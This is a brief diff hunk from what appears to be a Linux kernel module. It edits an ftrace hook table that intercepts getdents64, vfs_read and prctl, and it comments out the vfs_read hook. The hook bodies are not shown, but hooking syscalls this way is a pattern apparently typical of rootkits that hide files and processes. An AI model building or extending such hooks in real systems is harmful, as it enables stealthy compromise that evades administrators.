@@ -1012,7 +1012,7 @@ static asmlinkage long hk_prctl(const struct pt_regs *regs);
 
 static struct ftrace_hook hooks[] = {
     { .name = "__x64_sys_getdents64", .hook = hook_getdents64, .orig = &orig_getdents64 },
-    { .name = "vfs_read", .hook = hook_vfs_read, .orig = &orig_vfs_read },
+    // { .name = "vfs_read", .hook = hook_vfs_read, .orig = &orig_vfs_read },
     { .name = "__x64_sys_prctl", .hook = hk_prctl, .orig = &orig_prctl },
 };
 
